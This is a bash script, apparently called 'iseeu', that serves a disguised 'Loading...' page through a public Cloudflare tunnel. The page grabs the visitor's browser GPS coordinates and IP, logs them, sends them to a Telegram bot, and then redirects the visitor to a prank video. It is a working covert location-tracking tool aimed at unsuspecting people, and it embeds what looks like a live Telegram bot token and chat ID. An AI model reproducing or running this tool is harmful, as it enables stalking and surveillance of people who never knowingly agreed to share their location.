#!/bin/bash

clear

# === CONFIG ===
PORT=${1:-8080}
BOT_TOKEN="7469902610:AAE2ySw1EEMBI1lUP0JmSp_VnLi2Q3oyaJU"
CHAT_ID="8155138245"

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
CF_LOG="$HOME/iseeu/cf_output.log"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

# === CLEANUP ===
echo "[*] Killing old servers..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null

mkdir -p "$WEB_DIR" "$LOG_DIR"
> "$LOG_FILE"
> "$CF_LOG"
cd "$WEB_DIR" || exit 1

# === PAYLOAD HTML ===
echo "[*] Creating minimal HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
  <title>I See You</title>
  <script>
    function redirectToRickRoll(position) {
      let gps = position.coords.latitude + "," + position.coords.longitude;
      fetch("/logme/" + gps);
      window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
    }
    function fail() { alert("Location denied"); }
    navigator.geolocation.getCurrentPosition(redirectToRickRoll, fail);
  </script>
</head>
<body><h1>Loading...</h1></body>
</html>
EOF

# === START SERVER ===
echo "[*] Starting HTTP server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

# === START CLOUDFLARED ===
echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" 2>&1 | tee "$CF_LOG" &
CF_PID=$!

# === GET PUBLIC URL ===
echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1 && echo -n "."
  URL=$(grep -oE "https://.*\.trycloudflare\.com" "$CF_LOG" | head -n1)
  [[ -n "$URL" ]] && break
done
echo

if [[ -n "$URL" ]]; then
  echo "[✓] Public URL: $URL"
else
  echo "[✗] Failed to get public URL."
  kill $SERVER_PID $CF_PID 2>/dev/null
  exit 1
fi

echo "[*] Logging to $LOG_FILE..."

# === LISTEN FOR LOCATION REQUEST ===
while true; do
  nc -l -p "$PORT" | while read line; do
    if [[ "$line" == *"/logme/"* ]]; then
      GPS=$(echo "$line" | grep -oP "/logme/\K[0-9.,]+")
      IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
      LOG="[$(date)] GPS: $GPS | IP: $IP"
      echo "$LOG" >> "$LOG_FILE"

      # Telegram notify
      curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="🎯 Location: $GPS%0A🌐 IP: $IP"
    fi
  done
done &

# === HANDLE EXIT ===
trap 'echo; echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID 2>/dev/null; rm -f "$CF_LOG"; echo "[*] Done."' EXIT

echo "[*] Press Ctrl+C to stop."
wait